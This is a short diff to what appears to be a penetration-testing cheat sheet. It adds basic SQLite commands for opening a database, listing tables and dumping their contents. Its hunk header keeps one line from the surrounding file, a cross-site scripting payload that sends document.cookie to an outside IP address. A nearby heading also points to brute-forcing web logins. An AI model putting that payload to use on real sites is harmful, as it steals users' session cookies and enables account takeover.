@@ -90,6 +90,31 @@ i.src="http://172.30.10.210:8888/?"+document.cookie;
 ##################################################################
 -->
 
+## [SQLite](https://www.sqlitetutorial.net/sqlite-commands/)
+
+### Access Database
+
+`sqlite3 databasename.db`
+
+### Show Tables
+
+`.tables`
+
+### Show Table Info
+
+`PRAGMA table_info(tablename);`
+`.schema tablename`
+
+### Dump Info From Table
+
+`SELECT * FROM customers;`
+`.dump tablename`
+
+<!--
+##################################################################
+##################################################################
+-->
+
 ## Useful Commands
 
 ### Brute Force Web Login
